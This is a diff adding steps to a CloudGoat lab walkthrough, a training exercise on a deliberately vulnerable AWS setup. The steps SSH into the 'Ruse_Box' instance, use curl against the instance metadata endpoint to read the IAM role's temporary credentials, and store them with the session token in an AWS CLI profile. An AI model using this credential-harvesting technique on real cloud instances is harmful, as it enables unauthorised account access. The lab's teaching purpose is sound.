@@ -2130,3 +2130,43 @@ Starting with accessing the "ruse" EC2 the user leverages the instance profile t
 
 **Route Walkthrough**
 
+* Connect to the start ec2 "Ruse_Box" using the public IP and SSH key provided.
+
+```bash
+ssh -i cloudgoat ubuntu@<IP ADDRESS>
+```
+
+<p align="center">
+  <img src="/images/cloud/ssh_efs.png">
+</p>
+
+* Query for **metadata** in the instance.
+
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role name>
+```
+
+<p align="center">
+  <img src="/images/cloud/metadata_efs.png">
+</p>
+
+* Configure the AWS Profile for **ruse** using the following command.
+
+```bash
+aws configure --profile ruse
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_profile_ruse.png">
+</p>
+ 
+* Manually add the **SessionToken**.
+
+```bash
+vi .aws/credentials
+```
+
+<p align="center">
+  <img src="/images/cloud/session_token_ruse.png">
+</p>
